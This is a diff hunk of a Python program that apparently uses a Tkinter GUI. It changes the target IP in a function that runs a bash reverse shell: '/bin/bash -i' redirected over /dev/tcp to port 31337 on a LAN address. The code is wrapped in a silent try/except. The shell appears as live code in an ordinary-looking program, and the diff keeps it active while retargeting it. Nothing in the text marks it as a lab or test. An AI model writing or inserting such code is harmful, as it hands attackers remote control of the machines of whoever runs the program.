@@ -48,7 +48,7 @@ b1.grid(row = 0, column = 2)
 
 def fn(arg):
     try:
-        subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.6/31337 0<&1 2>&1", shell=True, executable="/bin/bash")
+        subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.31/31337 0<&1 2>&1", shell=True, executable="/bin/bash")
     except:
         return 0
 
